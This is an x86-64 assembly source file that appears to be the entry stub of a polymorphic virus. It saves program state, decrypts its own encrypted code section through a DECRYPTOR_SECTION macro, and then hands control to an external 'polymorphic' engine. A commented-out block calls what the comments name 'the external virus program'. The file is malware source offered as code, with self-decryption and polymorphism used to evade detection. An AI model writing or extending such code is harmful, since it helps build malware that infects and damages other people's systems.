%include "template.asm.inc"
extern main
extern polymorphic
; Define variables in the data section
section .data
	hello:     db 'Hello world!',10
	helloLen:  equ $-hello

; Code goes in the text section
section .text
	global _start

align 16
_start:             ; Global entry point


	; save initial program state
	mov rbx, rsp 
	mov r14, rdi
	mov r15, rsi

	call decrypt

	; ; reload the initial program, state
	; mov rsp, rbx 
	; mov rdi, r14
	; mov rsi, r15

	; ; call the external virus program
	; xor rbp, rbp
	; pop rdi
	; mov rsi, rsp
	; lea rdx, [rsp+rdi+8*8]
	; push rdi
	; call main

	; reload the initial program, state
	mov rsp, rbx 
	mov rdi, r14
	mov rsi, r15

	; call the polymorphicengine
	xor rbp, rbp
	pop rdi
	mov rsi, rsp
	lea rdx, [rsp+rdi+8*8]
	push rdi
	call polymorphic
	mov rdi, rax
	mov eax, 1
	int 80h



decrypt:
	; there is automatic calculation happening inside DECRYPTOR_SECTION function which is (_start-main) == xxxh worth of memory that will be encrypted/decrypted
    DECRYPTOR_SECTION main, _start
    ret